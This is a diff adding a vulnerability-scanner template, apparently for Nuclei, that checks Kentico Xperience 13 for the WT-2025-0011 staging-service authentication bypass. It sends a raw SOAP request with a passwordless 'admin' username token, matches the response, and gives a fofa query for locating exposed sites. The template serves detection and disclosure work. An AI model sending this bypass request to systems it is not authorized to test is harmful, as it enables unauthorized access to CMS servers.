@@ -1,0 +1,71 @@
+id: kentico-13-auth-bypass-wt-2025-0011
+
+info:
+  name: Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0011)
+  author: DhiyaneshDK
+  severity: unknown
+  description: |
+    Before Kentico Xperience 13 Hotfix 173, this vulnerability can be exploited with any username provided. For Hotfix >= 173 and < 178, this vulnerability can be exploited only if you provide a valid Staging Service username (default: admin)
+  reference:
+    - https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Kentico-CMS"
+  tags: kentico,stag,auth-bypass,xperience13
+
+variables:
+  rand: "{{to_lower(rand_text_alpha(32))}}"
+
+http:
+  - raw:
+      - |
+        POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData
+
+        <?xml version="1.0" encoding="utf-8"?>
+            <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+                <soap:Header>
+                    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
+                        <wsse:UsernameToken>
+                            <wsse:Username>admin</wsse:Username>
+                        </wsse:UsernameToken>
+                    </wsse:Security>
+                </soap:Header>
+                <soap:Body>
+                    <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
+                        <stagingTaskData><![CDATA[<{{rand}}>]]></stagingTaskData>
+                    </ProcessSynchronizationTaskData>
+                </soap:Body>
+            </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{rand}}"
+          - "<wsa:Action>"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "Site not running"
+          - "SyncServer.ErrorLicense"
+          - "SyncServer.ErrorServiceNotEnabled"
+          - "Staging service is not enabled on this server"
+          - "Staging does not work with blank password"
+          - "Missing X509 certificate token"
+          - "The security token could not be authenticated or authorized"
+        condition: or
+        negative: true
+
+      - type: word
+        part: content_type
+        words:
+          - "text/xml"
+# digest: 4a0a00473045022100f0b80dfbbd8dcbbbdc0a36c20731ea8b213a9517acd24ddaf042aa1081fcdef9022064a1023b0eda77ce2409257aa321253d4ed7ac1cf4d8236fbbad598eab1a3ea1:922c64590222798bb761d5b6d8e72950
